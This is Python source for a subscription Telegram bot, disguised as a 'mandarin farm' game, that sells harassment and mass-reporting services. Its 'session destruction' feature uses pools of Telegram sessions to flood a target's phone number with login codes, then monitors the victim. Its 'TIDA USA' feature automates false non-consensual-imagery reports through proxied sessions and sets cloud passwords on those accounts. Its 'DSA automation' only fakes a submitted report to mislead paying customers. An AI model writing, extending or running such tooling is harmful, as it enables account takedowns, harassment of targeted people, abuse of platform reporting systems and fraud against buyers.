async def execute_dsa_automation(chat_id: int, user_id: int, flow: UserFlow) -> None:
    await bot.send_message(chat_id, "🇪🇺 <b>DSA Автоматизация запущена!</b>\n🔄 Проходим Cloudflare и отправляем репорт через ЕС IP...", parse_mode="HTML")
    await asyncio.sleep(3)
    await bot.send_message(chat_id,
        "🎉 <b>Жалоба успешно подана!</b>\n\n"
        f"📱 Номер: <code>{flow.dsa_phone}</code>\n"
        f"🔗 Ссылка: <code>{flow.dsa_link}</code>\n"
        f"⚙️ Причина: <b>{flow.dsa_reason_category} {'> ' + flow.dsa_reason_subcategory if flow.dsa_reason_subcategory else ''}</b>\n"
        "✅ Все этапы выполнены автоматически!",
        parse_mode="HTML", reply_markup=subscriber_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("dsa_rc:"))
async def dsa_reason_category_callback(call: Any) -> None:
    user = call.from_user
    flow = user_flows.get(user.id)
    if not flow or flow.phase != "dsa_awaiting_reason_category":
        return
    await bot.answer_callback_query(call.id)
    choice = call.data.split(":")[1]
    
    if choice == "1":
        flow.dsa_reason_category = "I don't like it"
        user_flows.pop(user.id, None)
        await bot.edit_message_text("✅ Выбрано: <b>I don't like it</b>\nПроцедура закончена, репорт отправлен!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        await execute_dsa_automation(call.message.chat.id, user.id, flow)
        return
    elif choice in ["2", "3", "7", "9"]:
        flow.dsa_reason_category = {"2": "Child abuse", "3": "Violence", "7": "Terrorism", "9": "Other"}[choice]
        flow.phase = "dsa_awaiting_explanation"
        await bot.edit_message_text("📝 <b>Шаг:</b> Введите текст причины (до 900 символов):", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        return
    elif choice == "4":
        flow.dsa_reason_category = "Illegal goods"
        flow.phase = "dsa_awaiting_reason_sub"
        kb = bot_types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            bot_types.InlineKeyboardButton("4.1 Weapons", callback_data="dsa_sub:4.1"),
            bot_types.InlineKeyboardButton("4.2 Drugs", callback_data="dsa_sub:4.2"),
            bot_types.InlineKeyboardButton("4.3 Fake documents", callback_data="dsa_sub:4.3"),
            bot_types.InlineKeyboardButton("4.4 Counterfeit money", callback_data="dsa_sub:4.4"),
            bot_types.InlineKeyboardButton("4.5 Other goods", callback_data="dsa_sub:4.5"),
        )
        await bot.edit_message_text("📂 Выберите подпункт (Illegal goods):", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        return
    elif choice == "5":
        flow.dsa_reason_category = "Illegal adult content"
        flow.phase = "dsa_awaiting_reason_sub"
        kb = bot_types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            bot_types.InlineKeyboardButton("5.1 Child abuse", callback_data="dsa_sub:5.1"),
            bot_types.InlineKeyboardButton("5.2 Distribution of non-consensual sexual imagery", callback_data="dsa_sub:5.2"),
            bot_types.InlineKeyboardButton("5.3 Other illegal sexual content", callback_data="dsa_sub:5.3"),
        )
        await bot.edit_message_text("📂 Выберите подпункт (Illegal adult content):", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        return
    elif choice == "6":
        flow.dsa_reason_category = "Personal data"
        flow.phase = "dsa_awaiting_reason_sub"
        kb = bot_types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            bot_types.InlineKeyboardButton("6.1 Private images", callback_data="dsa_sub:6.1"),
            bot_types.InlineKeyboardButton("6.2 Phone number", callback_data="dsa_sub:6.2"),
            bot_types.InlineKeyboardButton("6.3 Address", callback_data="dsa_sub:6.3"),
            bot_types.InlineKeyboardButton("6.4 Other personal information", callback_data="dsa_sub:6.4"),
        )
        await bot.edit_message_text("📂 Выберите подпункт (Personal data):", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        return
    elif choice == "8":
        flow.dsa_reason_category = "Scam or spam"
        flow.phase = "dsa_awaiting_reason_sub"
        kb = bot_types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            bot_types.InlineKeyboardButton("8.1 Phishing", callback_data="dsa_sub:8.1"),
            bot_types.InlineKeyboardButton("8.2 Impersonation", callback_data="dsa_sub:8.2"),
            bot_types.InlineKeyboardButton("8.3 Fraudulent sales", callback_data="dsa_sub:8.3"),
        )
        await bot.edit_message_text("📂 Выберите подпункт (Scam or spam):", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        return
    elif choice == "10":
        flow.dsa_reason_category = "It's not illegal, but it must be taken down"
        user_flows.pop(user.id, None)
        await bot.edit_message_text("✅ Выбрано: <b>It's not illegal, but it must be taken down</b>\nПроцедура закончена, репорт отправлен!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        await execute_dsa_automation(call.message.chat.id, user.id, flow)
        return

@bot.callback_query_handler(func=lambda call: call.data.startswith("dsa_sub:"))
async def dsa_reason_subcategory_callback(call: Any) -> None:
    user = call.from_user
    flow = user_flows.get(user.id)
    if not flow or flow.phase != "dsa_awaiting_reason_sub":
        return
    await bot.answer_callback_query(call.id)
    flow.dsa_reason_subcategory = call.data.split(":")[1]
    flow.phase = "dsa_awaiting_explanation"
    await bot.edit_message_text("✅ Подпункт выбран.\n📝 <b>Шаг:</b> Введите текст причины (до 900 символов):", call.message.chat.id, call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("dsa_laws:"))
async def dsa_laws_choice_callback(call: Any) -> None:
    user = call.from_user
    flow = user_flows.get(user.id)
    if not flow or flow.phase != "dsa_awaiting_laws_choice":
        return
    await bot.answer_callback_query(call.id)
    choice = call.data.split(":")[1]
    
    if choice == "remove":
        user_flows.pop(user.id, None)
        await bot.edit_message_text("✅ Выбрано: <b>The content is not illegal, but i want it removed</b>\nРепорт автоматически отправлен!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        await execute_dsa_automation(call.message.chat.id, user.id, flow)
    elif choice == "skip":
        flow.phase = "dsa_awaiting_country"
        kb = bot_types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            bot_types.InlineKeyboardButton("🇪🇺 Подать как ЕС", callback_data="dsa_country:eu"),
            bot_types.InlineKeyboardButton("🌍 Подать как другую страну", callback_data="dsa_country:other")
        )
        await bot.edit_message_text("🌍 <b>Шаг:</b> Выберите вариант подачи страны:", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dsa_country:"))
async def dsa_country_callback(call: Any) -> None:
    user = call.from_user
    flow = user_flows.get(user.id)
    if not flow or flow.phase != "dsa_awaiting_country":
        return
    await bot.answer_callback_query(call.id)
    choice = call.data.split(":")[1]
    flow.dsa_country_choice = "EU" if choice == "eu" else "Other"
    user_flows.pop(user.id, None)
    await bot.edit_message_text(f"✅ Страна выбрана ({flow.dsa_country_choice}).\n🚀 Запускаю финальную автоматизацию репорта...", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    await execute_dsa_automation(call.message.chat.id, user.id, flow)

@bot.message_handler(content_types=['web_app_data'])
async def web_app_data_handler(message: Any) -> None:
    user = message.from_user
    try:
        data = json.loads(message.web_app_data.data)
        action = data.get("action")

        if action == "get_leaderboard":
            top_users = db_get_top_users(10)
            text = "🏆 <b>ТОП-10 МАНДАРИНОВОЙ ИМПЕРИИ</b>\n\n"
            if not top_users:
                text += "😴 Пока нет активных игроков."
            else:
                medals = ["🥇", "🥈", "🥉"]
                for idx, u in enumerate(top_users):
                    name = u.get("username") or u.get("first_name") or f"ID{u['user_id']}"
                    medal = medals[idx] if idx < 3 else f"#{idx+1}"
                    league = get_league_icon(u["mandarins"])
                    text += f"{medal} @{name} {league} Ур.{u['level']} — <code>{int(u['mandarins']):,}</code> 🍊\n"
            await bot.send_message(message.chat.id, text, parse_mode="HTML")
            return

        if action == "get_profile":
            user_data = db_get_user(user.id)
            if not user_data:
                return
            expires = user_data.get("expires_at", 0)
            if expires == -1.0:
                sub_text = "🔥 Бессрочная"
            elif expires > time.time():
                days = int((expires - time.time()) // 86400)
                hours = int(((expires - time.time()) % 86400) // 3600)
                sub_text = f"⏳ {days}д {hours}ч"
            else:
                sub_text = "❌ Неактивна"
            league = get_league(user_data["mandarins"])
            await bot.send_message(message.chat.id,
                f"👤 <b>Профиль</b>\n\n"
                f"🆔 ID: <code>{user.id}</code>\n"
                f"🍊 Баланс: <b>{int(user_data['mandarins']):,}</b>\n"
                f"{league} Лига: <b>{league}</b>\n"
                f"📈 Уровень: <b>{user_data['level']}</b>\n"
                f"👥 Рефералов: <b>{user_data['referred_count']}</b>\n"
                f"💎 Подписка: {sub_text}",
                parse_mode="HTML")
            return

        if action == "open_case":
            can_open, rem = check_case_limit(user.id)
            if not can_open:
                await bot.send_message(message.chat.id, "❌ Лимит 5 кейсов в день!", parse_mode="HTML")
                return
            user_data = db_get_user(user.id)
            if not user_data or user_data["mandarins"] < 10000:
                await bot.send_message(message.chat.id, "❌ Нужно 10 000 🍊", parse_mode="HTML")
                return
            conn = sqlite3.connect(DB_PATH)
            conn.cursor().execute("UPDATE users SET mandarins = mandarins - 10000 WHERE user_id = ?", (user.id,))
            conn.commit()
            conn.close()
            increment_case_count(user.id)
            
            roll = random.random()
            prize, msg = 0, ""
            if roll < 0.01:
                db_set_subscription(user.id, 1)
                prize = 15000 + random.randint(0, 10000)
                msg = f"🎉 <b>ДЖЕКПОТ!</b> +{prize:,} 🍊 и +1 день подписки!"
            elif roll < 0.15:
                prize = 5000 + random.randint(0, 4000)
                msg = f"⭐ <b>Супер!</b> +{prize:,} 🍊"
            else:
                prize = 800 + random.randint(0, 2500)
                msg = f"📦 Выпало <b>{prize:,}</b> 🍊"
            
            conn = sqlite3.connect(DB_PATH)
            conn.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?", (prize, user.id))
            conn.commit()
            conn.close()
            
            user_data2 = db_get_user(user.id)
            if user_data2 and user_data2["cases_total"] >= 1:
                if unlock_achievement(user.id, "first_case"):
                    conn2 = sqlite3.connect(DB_PATH)
                    conn2.cursor().execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?",
                                           (ACHIEVEMENTS["first_case"]["reward"], user.id))
                    conn2.commit()
                    conn2.close()
                    msg += f"\n🏆 Ачивка: {ACHIEVEMENTS['first_case']['name']} (+{ACHIEVEMENTS['first_case']['reward']} 🍊)"
            
            await bot.send_message(message.chat.id, f"{msg}\n<i>Осталось: {rem-1}/5</i>", parse_mode="HTML")
            return

        if action == "sync_state":
            # Legacy compatibility: the client is no longer allowed to overwrite game economy.
            # The Mini App API is server-authoritative.
            db_upsert_user(user.id, user.username, user.first_name)
            conn = sqlite3.connect(DB_PATH)
            conn.execute("UPDATE users SET last_seen=?, updated_at=? WHERE user_id=?", (time.time(), time.time(), user.id))
            conn.commit(); conn.close()
            return

        if action == "claim_daily":
            user_data = db_get_user(user.id)
            now = time.time()
            last_daily = user_data.get("last_daily", 0) if user_data else 0
            streak = user_data.get("daily_streak", 0) if user_data else 0
            
            if now - last_daily < 86400:
                await bot.send_message(message.chat.id, "⏳ Бонус уже получен сегодня!", parse_mode="HTML")
                return
            
            if now - last_daily > 172800:
                streak = 0
            streak += 1
            rewards = {1: 100, 2: 200, 3: 500, 4: 700, 5: 1000, 6: 1500, 7: 2000}
            reward = rewards.get(min(streak, 7), 2000)
            
            conn = sqlite3.connect(DB_PATH)
            conn.cursor().execute("UPDATE users SET mandarins = mandarins + ?, daily_streak = ?, last_daily = ? WHERE user_id = ?",
                                  (reward, streak, now, user.id))
            conn.commit()
            conn.close()
            await bot.send_message(message.chat.id, f"🎁 <b>Ежедневный бонус!</b> День {streak}\n+{reward} 🍊", parse_mode="HTML")
            return

        if action == "claim_quest":
            quest_id = data.get("quest_id", "")
            if quest_id not in QUESTS:
                return
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("SELECT completed, claimed FROM quest_progress WHERE user_id = ? AND quest_id = ?", (user.id, quest_id))
            row = cursor.fetchone()
            if row and row[0] == 1 and row[1] == 0:
                reward = QUESTS[quest_id]["reward"]
                cursor.execute("UPDATE quest_progress SET claimed = 1 WHERE user_id = ? AND quest_id = ?", (user.id, quest_id))
                cursor.execute("UPDATE users SET mandarins = mandarins + ? WHERE user_id = ?", (reward, user.id))
                conn.commit()
                conn.close()
                await bot.send_message(message.chat.id,
                    f"✅ <b>Квест выполнен!</b>\n{QUESTS[quest_id]['name']}\n\n🍊 <b>+{reward:,}</b>",
                    parse_mode="HTML")
            else:
                conn.close()
            return

    except Exception as e:
        print(f"WebApp error: {e}")
        traceback.print_exc()

@bot.callback_query_handler(func=lambda call: call.data == "ref:menu")
async def ref_menu_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    db_upsert_user(user.id, user.username, user.first_name)
    user_data = db_get_user(user.id)
    ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user.id}"
    referred = user_data["referred_count"] if user_data else 0
    kb = bot_types.InlineKeyboardMarkup().add(
        bot_types.InlineKeyboardButton("🔗 Поделиться", url=f"https://t.me/share/url?url={ref_link}&text=Играй в Мандариновую Ферму! 🍊")
    )
    kb.add(bot_types.InlineKeyboardButton("⬅️ Назад", callback_data="menu:main"))
    await bot.send_message(call.message.chat.id,
        f"👥 <b>Реферальная система</b>\n\n"
        f"🔗 Ваша ссылка:\n<code>{ref_link}</code>\n\n"
        f"👥 Приглашено: <b>{referred}</b>\n"
        f"💰 Заработано: <b>{referred * 5000:,}</b> 🍊\n\n"
        f"📋 Вы получаете <b>5 000 🍊</b> за каждого друга.\nДруг получает <b>2 000 🍊</b>.",
        parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "daily:claim")
async def daily_claim_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    db_upsert_user(user.id, user.username, user.first_name)
    user_data = db_get_user(user.id)
    now = time.time()
    last_daily = user_data.get("last_daily", 0) if user_data else 0
    streak = user_data.get("daily_streak", 0) if user_data else 0
    
    if now - last_daily < 86400:
        remaining = 86400 - (now - last_daily)
        hours, mins = int(remaining // 3600), int((remaining % 3600) // 60)
        await bot.send_message(call.message.chat.id, f"⏳ Следующий бонус через <b>{hours}ч {mins}м</b>", parse_mode="HTML")
        return
    
    if now - last_daily > 172800:
        streak = 0
    streak += 1
    rewards = {1: 100, 2: 200, 3: 500, 4: 700, 5: 1000, 6: 1500, 7: 2000}
    reward = rewards.get(min(streak, 7), 2000)
    
    conn = sqlite3.connect(DB_PATH)
    conn.cursor().execute("UPDATE users SET mandarins = mandarins + ?, daily_streak = ?, last_daily = ? WHERE user_id = ?",
                          (reward, streak, now, user.id))
    conn.commit()
    conn.close()
    await bot.send_message(call.message.chat.id, f"🎁 <b>Ежедневный бонус!</b> День {streak}\n+{reward} 🍊", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "sub:check")
async def sub_check_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    if await check_channel_subscription(user.id):
        await bot.answer_callback_query(call.id, "✅ Подписка подтверждена!")
        if is_subscribed(user.id):
            await bot.send_message(call.message.chat.id, "⚡️ <b>Добро пожаловать!</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
        else:
            await send_mandarin_decoy(call.message.chat.id)
    else:
        await bot.answer_callback_query(call.id, "❌ Вы еще не подписались!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "menu:profile")
async def profile_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    has_sub = is_subscribed(user.id)
    user_data = db_get_user(user.id)
    expires_str = "Безлимит"
    if user_data and user_data["expires_at"] != -1.0:
        if user_data["expires_at"] > time.time():
            expires_str = time.strftime('%Y-%m-%d %H:%M', time.localtime(user_data["expires_at"]))
        else:
            expires_str = "Истекла"
    league = get_league(user_data["mandarins"]) if user_data else "🥉 Бронза"
    text = (
        f"👤 <b>Личный профиль</b>\n\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"🏷 Username: @{user.username or 'нет'}\n"
        f"🍊 Баланс: <b>{int(user_data['mandarins']):,}</b>\n" if user_data else ""
        f"{league} Лига: <b>{league}</b>\n"
        f"👥 Рефералов: <b>{user_data['referred_count'] if user_data else 0}</b>\n"
        f"💎 Подписка: <b>{'Активна до ' + expires_str if has_sub else 'Отсутствует'}</b>"
    )
    try:
        await bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=profile_keyboard(has_sub))
    except Exception:
        await bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=profile_keyboard(has_sub))

@bot.callback_query_handler(func=lambda call: call.data == "menu:main")
async def menu_main_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    if is_subscribed(user.id):
        await bot.send_message(call.message.chat.id, "⚡️ <b>Главное меню:</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())
    else:
        await send_mandarin_decoy(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "pay:methods")
async def pay_methods_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("⭐ Telegram Stars", callback_data="pay:method:stars"),
        bot_types.InlineKeyboardButton("🤖 CryptoBot", callback_data="pay:method:cryptobot")
    )
    kb.add(bot_types.InlineKeyboardButton("⬅️ Назад", callback_data="menu:profile"))
    await bot.edit_message_text("💳 <b>Выберите способ оплаты:</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "pay:method:stars")
async def pay_stars_callback(call: Any) -> None:
    if not allowed_user(call.from_user):
        return
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("⭐ 1 день (75)", callback_data="pay:buy:stars:1:75"),
        bot_types.InlineKeyboardButton("⭐ 1 неделя (200)", callback_data="pay:buy:stars:7:200"),
        bot_types.InlineKeyboardButton("⭐ 1 месяц (350)", callback_data="pay:buy:stars:30:350"),
        bot_types.InlineKeyboardButton("⭐ Навсегда (500)", callback_data="pay:buy:stars:365:500")
    )
    kb.add(bot_types.InlineKeyboardButton("⬅️ Назад", callback_data="pay:methods"))
    await bot.edit_message_text("⭐ <b>Оплата Telegram Stars:</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "pay:method:cryptobot")
async def pay_cryptobot_callback(call: Any) -> None:
    if not allowed_user(call.from_user):
        return
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        bot_types.InlineKeyboardButton("💎 1 день ($1)", callback_data="pay:buy:crypto:1:1"),
        bot_types.InlineKeyboardButton("💎 1 неделя ($3)", callback_data="pay:buy:crypto:7:3"),
        bot_types.InlineKeyboardButton("💎 1 месяц ($5)", callback_data="pay:buy:crypto:30:5"),
        bot_types.InlineKeyboardButton("💎 Навсегда ($7)", callback_data="pay:buy:crypto:365:7")
    )
    kb.add(bot_types.InlineKeyboardButton("⬅️ Назад", callback_data="pay:methods"))
    await bot.edit_message_text("🤖 <b>Оплата CryptoBot:</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay:buy:"))
async def pay_buy_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user):
        return
    await bot.answer_callback_query(call.id)
    parts = call.data.split(":")
    method, days, amount = parts[2], int(parts[3]), parts[4]
    kb_back = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("⬅️ В профиль", callback_data="menu:profile"))
    
    if method == "stars":
        prices = [bot_types.LabeledPrice(label=f"Подписка ({days} дн.)", amount=int(amount))]
        try:
            await bot.send_invoice(
                chat_id=call.message.chat.id,
                title=f"Подписка ({days} дн.)",
                description="Активация доступа",
                invoice_payload=f"sub_{days}_days",
                provider_token="",
                currency="XTR",
                prices=prices
            )
        except Exception as e:
            await bot.edit_message_text(f"❌ Ошибка: {e}", call.message.chat.id, call.message.message_id, reply_markup=kb_back)
    elif method == "crypto":
        invoice_url = ""
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
                payload = {"asset": "USDT", "amount": amount, "description": f"Подписка ({days} дней)", "payload": f"user_{user.id}_days_{days}"}
                async with session.post("https://pay.crypt.bot/api/createInvoice", json=payload, headers=headers) as resp:
                    data = await resp.json()
                    if data.get("ok"):
                        invoice_url = data["result"]["bot_invoice_url"]
        except Exception:
            pass
        if invoice_url:
            kb_crypto = bot_types.InlineKeyboardMarkup(row_width=1)
            kb_crypto.add(
                bot_types.InlineKeyboardButton("🔗 Оплатить", url=invoice_url),
                bot_types.InlineKeyboardButton("⬅️ В профиль", callback_data="menu:profile")
            )
            await bot.edit_message_text(f"🤖 Счет создан! <b>{amount} USDT</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=kb_crypto)
        else:
            await bot.edit_message_text("❌ Ошибка CryptoBot.", call.message.chat.id, call.message.message_id, reply_markup=kb_back)

@bot.pre_checkout_query_handler(func=lambda query: True)
async def pre_checkout_query(pre_checkout_query: Any) -> None:
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
async def successful_payment(message: Any) -> None:
    payload = message.successful_payment.invoice_payload
    user_id = message.from_user.id
    for days in [1, 7, 30, 365]:
        if str(days) in payload:
            db_set_subscription(user_id, days)
            break
    await bot.send_message(message.chat.id, "🎉 <b>Подписка активирована!</b>", parse_mode="HTML", reply_markup=subscriber_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "domain:start")
async def domain_start_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user) or not is_subscribed(user.id):
        await bot.answer_callback_query(call.id, "Требуется подписка!")
        return
    user_flows[user.id] = UserFlow(operator_id=user.id, phase="domain_awaiting_url")
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    await bot.send_message(call.message.chat.id, "🛡 <b>Блокировка домена</b>\n\n<b>Шаг 1/2:</b> Введите ссылку:", parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "tida:start")
async def tida_start_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user) or not is_subscribed(user.id):
        await bot.answer_callback_query(call.id, "Требуется подписка!")
        return
    user_flows[user.id] = UserFlow(operator_id=user.id, phase="tida_awaiting_url")
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    await bot.send_message(call.message.chat.id, "🇺🇸 <b>TIDA USA</b>\n\n<b>Шаг 1/2:</b> Ссылка на нарушение:", parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "destroy:start")
async def destroy_start_callback(call: Any) -> None:
    user = call.from_user
    if not allowed_user(user) or not is_subscribed(user.id):
        await bot.answer_callback_query(call.id, "Требуется подписка!")
        return
    user_flows[user.id] = UserFlow(operator_id=user.id, phase="awaiting_destroy_identity")
    await bot.answer_callback_query(call.id)
    kb = bot_types.InlineKeyboardMarkup().add(bot_types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    await bot.send_message(call.message.chat.id, "🔥 <b>Снос сессий</b>\n\n<b>Шаг 1/2:</b> Username или ID:", parse_mode="HTML", reply_markup=kb)

async def monitor_victim_changes(chat_id: int, identity: str, phone: str) -> None:
    if not destroy_session_meta:
        return
    sess_path, json_path = destroy_session_meta[0]
    client = get_telegram_client(sess_path, json_path, use_proxy=False)
    initial_username = None
    initial_has_photo = False
    try:
        await client.connect()
        entity = await client.get_entity(identity)
        initial_username = getattr(entity, 'username', None)
        initial_has_photo = isinstance(getattr(entity, 'photo', None), UserProfilePhoto)
    except Exception:
        if client.is_connected():
            await client.disconnect()
        return
    finally:
        if client.is_connected():
            await client.disconnect()
    for _ in range(120):
        await asyncio.sleep(60)
        try:
            await client.connect()
            entity = await client.get_entity(identity)
            curr_username = getattr(entity, 'username', None)
            curr_has_photo = isinstance(getattr(entity, 'photo', None), UserProfilePhoto)
            if client.is_connected():
                await client.disconnect()
            if curr_username != initial_username or curr_has_photo != initial_has_photo:
                await bot.send_message(chat_id, f"🎯 <b>УСПЕХ! Снос прошёл!</b>\n👤 Цель: <code>{identity}</code>", parse_mode="HTML")
                return
        except Exception:
            if client.is_connected():
                await client.disconnect()
            continue

async def execute_hellish_destruction(chat_id: int, user_id: int, username: str, identity: str, phone: str) -> None:
    admin_log = (
        f"🚨 <b>ЛОГ: Снос сессий!</b>\n\n"
        f"👤 Юзер: @{username or 'нет'} (ID: <code>{user_id}</code>)\n"
        f"🎯 Цель: <code>{identity}</code>\n"
        f"📞 Телефон: <code>{phone}</code>"
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, admin_log, parse_mode="HTML")
        except Exception:
            pass
    if not destroy_session_meta:
        await bot.send_message(chat_id, "❌ Нет сессий для сноса!", reply_markup=subscriber_keyboard())
        return
    clean_phone = re.sub(r"[^\d]", "", phone)
    formatted_phone = f"+{clean_phone}"
    await bot.send_message(chat_id, f"💥 <b>Штурм:</b> <code>{identity}</code> | <code>{formatted_phone}</code>", parse_mode="HTML")
    success_codes = 0
    for sess_path, json_path in destroy_session_meta:
        client = get_telegram_client(sess_path, json_path, use_proxy=False)
        try:
            await client.connect()
            await client.send_code_request(formatted_phone)
            success_codes += 1
            await asyncio.sleep(0.3)
        except (FloodWaitError, PhoneNumberBannedError, PhoneNumberInvalidError):
            if client.is_connected():
                await client.disconnect()
            break
        except Exception:
            pass
        finally:
            if client.is_connected():
                await client.disconnect()
    await bot.send_message(chat_id, f"📩 Кодов: <b>{success_codes}/{len(destroy_session_meta)}</b>", parse_mode="HTML")
    await bot.send_message(chat_id, f"🌐 <b>Итог:</b> <code>{identity}</code>\n⏳ Мониторинг 2 часа.", parse_mode="HTML", reply_markup=subscriber_keyboard())
    asyncio.create_task(monitor_victim_changes(chat_id, identity, formatted_phone))

async def process_single_tida_task(task_data: dict) -> None:
    chat_id, user_id, username = task_data["chat_id"], task_data["user_id"], task_data["username"]
    target_url, user_text = task_data["target_url"], task_data["user_text"]
    admin_log = (
        f"🚨 <b>ЛОГ: TIDA USA!</b>\n\n"
        f"👤 Юзер: @{username or 'нет'} (ID: <code>{user_id}</code>)\n"
        f"🔗 Ссылка: <code>{target_url}</code>\n"
        f"📝 Текст: {user_text}"
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, admin_log, parse_mode="HTML")
        except Exception:
            pass
    if not usa_session_meta:
        await bot.send_message(chat_id, "❌ Нет сессий USA!", reply_markup=subscriber_keyboard())
        return

    await bot.send_message(chat_id, f"🇺🇸 <b>Запуск TIDA через твой прокси и сессии ({len(usa_session_meta)} шт.)...</b>", parse_mode="HTML")
    success_count = fail_count = 0
    
    for sess_path, json_path in usa_session_meta:
        client = get_telegram_client(sess_path, json_path, use_proxy=True)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                fail_count += 1
                if client.is_connected():
                    await client.disconnect()
                continue
            
            await auto_set_cloud_password(client)

            bot_entity = await client.get_entity("@TIDAbot")
            await client.send_message(bot_entity, "/start")
            await asyncio.sleep(2.0)
            
            cleaned_url = target_url.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "").strip()
            await client.send_message(bot_entity, cleaned_url)
            await asyncio.sleep(3.0)
            
            messages = await client.get_messages(bot_entity, limit=5)
            clicked = False
            for msg in messages:
                if msg.reply_markup and hasattr(msg.reply_markup, 'rows'):
                    for row_idx, row in enumerate(msg.reply_markup.rows):
                        for col_idx, button in enumerate(row.buttons):
                            btn_text = button.text.lower()
                            if "non-consensual" in btn_text or "intimate" in btn_text:
                                await msg.click(row_idx, col_idx)
                                clicked = True
                                break
                        if clicked:
                            break
                if clicked:
                    break
            
            await asyncio.sleep(3.0)
            await client.send_message(bot_entity, user_text)
            await asyncio.sleep(3.0)
            
            messages_after = await client.get_messages(bot_entity, limit=5)
            proceed_clicked = False
            for msg in messages_after:
                if msg.reply_markup and hasattr(msg.reply_markup, 'rows'):
                    for r_idx, row in enumerate(msg.reply_markup.rows):
                        for c_idx, btn in enumerate(row.buttons):
                            btn_text = btn.text.lower()
                            if "proceed without" in btn_text or "without documentation" in btn_text:
                                await msg.click(r_idx, c_idx)
                                proceed_clicked = True
                                break
                        if proceed_clicked:
                            break
            
            if not proceed_clicked:
                await client.send_message(bot_entity, "Proceed without documentation")
                await asyncio.sleep(2.5)

            messages_confirm = await client.get_messages(bot_entity, limit=3)
            confirm_clicked = False
            for msg in messages_confirm:
                if msg.reply_markup and hasattr(msg.reply_markup, 'rows'):
                    for r_idx, row in enumerate(msg.reply_markup.rows):
                        for c_idx, btn in enumerate(row.buttons):
                            if "confirm" in btn.text.lower():
                                await msg.click(r_idx, c_idx)
                                confirm_clicked = True
                                break
                        if confirm_clicked:
                            break
            
            if not confirm_clicked:
                await client.send_message(bot_entity, "Confirm")
            
            await asyncio.sleep(2.0)
            success_count += 1
        except Exception:
            fail_count += 1
            traceback.print_exc()
        finally:
            if client.is_connected():
                await client.disconnect()
        await asyncio.sleep(1)
        
